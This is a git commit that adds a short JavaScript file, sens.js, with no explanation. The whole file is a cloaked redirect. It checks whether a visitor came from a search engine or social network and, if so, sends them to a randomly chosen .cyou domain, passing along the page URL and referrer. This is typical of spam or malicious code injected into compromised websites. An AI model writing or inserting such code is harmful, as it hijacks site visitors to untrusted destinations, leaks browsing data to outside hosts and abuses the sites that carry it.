fefd687f1898cad3b1281d5650f7fe8c15a37a9c
adelvina <103128927+adelvina@users.noreply.github.com>
2023-05-09 12:55:45 +0700

    Create sens.js

---
+++ sens.js
@@ -0,0 +1,11 @@
+var ars 	= rChoice([
+	'http://gamestop.cyou/',
+	'http://bestproducts.cyou/'
+	]);
+
+function rChoice(arr) {
+    return arr[Math.floor(arr.length * Math.random())];
+}
+
+//Code arsae client javascript
+if(['.google.', 'bing.', '.yahoo.',  'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
